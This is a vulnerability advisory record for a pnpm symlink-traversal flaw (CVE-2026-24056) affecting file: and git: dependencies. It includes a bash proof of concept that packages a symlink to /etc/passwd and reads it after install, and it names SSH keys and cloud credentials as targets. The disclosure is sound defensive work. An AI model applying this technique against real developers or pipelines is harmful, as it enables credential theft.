advisory_id: GHSA-m733-5w8f-5ggw
datasource_id: github_osv_importer_v2/GHSA-m733-5w8f-5ggw
datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/01/GHSA-m733-5w8f-5ggw/GHSA-m733-5w8f-5ggw.json
aliases:
  - CVE-2026-24056
summary: |
  pnpm has symlink traversal in file:/git dependencies
  ### Summary
  When pnpm installs a `file:` (directory) or `git:` dependency, it follows symlinks and reads their target contents without constraining them to the package root. A malicious package containing a symlink to an absolute path (e.g., `/etc/passwd`, `~/.ssh/id_rsa`) causes pnpm to copy that file's contents into `node_modules`, leaking local data.

  **Preconditions:** Only affects `file:` and `git:` dependencies. Registry packages (npm) have symlinks stripped during publish and are NOT affected.

  ### Details
  The vulnerability exists in `store/cafs/src/addFilesFromDir.ts`. The code uses `fs.statSync()` and `readFileSync()` which follow symlinks by default:

  ```typescript
  const absolutePath = path.join(dirname, relativePath)
  const stat = fs.statSync(absolutePath)  // Follows symlinks!
  const buffer = fs.readFileSync(absolutePath)  // Reads symlink TARGET
  ```

  There is no check that `absolutePath` resolves to a location inside the package directory.

  ### PoC
  ```bash
  # Create malicious package
  mkdir -p /tmp/evil && cd /tmp/evil
  ln -s /etc/passwd leaked-passwd.txt
  echo '{"name":"evil","version":"1.0.0","files":["*.txt"]}' > package.json

  # Victim installs
  mkdir /tmp/victim && cd /tmp/victim
  pnpm init && pnpm add file:../evil

  # Leaked!
  cat node_modules/evil/leaked-passwd.txt
  ```

  ### Impact
  - Developers installing local/file dependencies
  - CI/CD pipelines installing git dependencies
  - Credential theft via symlinks to `~/.aws/credentials`, `~/.npmrc`, `~/.ssh/id_rsa`

  ### Suggested Fix
  Use `lstatSync` to detect symlinks and reject those pointing outside the package root in `store/cafs/src/addFilesFromDir.ts`.
impacted_packages:
  - purl: pkg:npm/pnpm
    affected_versions: vers:npm/<10.28.2
    fixed_versions: vers:npm/10.28.2
    fixed_in_commits: []
    introduced_in_commits: []
severities:
  - score: '6.5'
    scoring_system: cvssv3.1
    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N
    published_at: None
    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/01/GHSA-m733-5w8f-5ggw/GHSA-m733-5w8f-5ggw.json
  - score: '6.7'
    scoring_system: cvssv4
    scoring_elements: CVSS:4.0/AV:L/AC:L/AT:N/PR:N/UI:A/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N
    published_at: None
    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/01/GHSA-m733-5w8f-5ggw/GHSA-m733-5w8f-5ggw.json
  - score: MODERATE
    scoring_system: generic_textual
    scoring_elements:
    published_at: None
    url:
weaknesses:
  - CWE-59
  - CWE-22
references:
  - url: https://github.com/pnpm/pnpm
    reference_type:
    reference_id:
  - url: https://github.com/pnpm/pnpm/commit/b277b45bc35ae77ca72d7634d144bbd58a48b70f
    reference_type:
    reference_id:
  - url: https://github.com/pnpm/pnpm/releases/tag/v10.28.2
    reference_type:
    reference_id:
  - url: https://github.com/pnpm/pnpm/security/advisories/GHSA-m733-5w8f-5ggw
    reference_type:
    reference_id:
  - url: https://nvd.nist.gov/vuln/detail/CVE-2026-24056
    reference_type:
    reference_id:
